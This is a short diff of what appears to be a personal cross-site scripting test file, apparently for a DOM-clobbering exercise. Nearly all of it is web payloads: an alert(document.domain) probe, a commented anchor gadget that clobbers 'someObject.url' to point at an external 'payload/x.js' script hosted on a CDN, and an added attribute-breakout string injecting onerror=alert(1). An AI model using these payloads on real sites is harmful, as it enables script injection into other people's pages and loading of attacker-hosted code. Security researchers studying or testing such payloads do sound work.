@@ -1,6 +1,7 @@
 alert(document.domain);
 
 //<span id=someObject><a id=someObject name=url href=https://cdn.jsdelivr.net/gh/Rajiv-Stha/payload@main/x.js>
+//href="cid:&quot;onerror=alert(1)//
 
 // vuln code (DOM Clobbering)
 /*
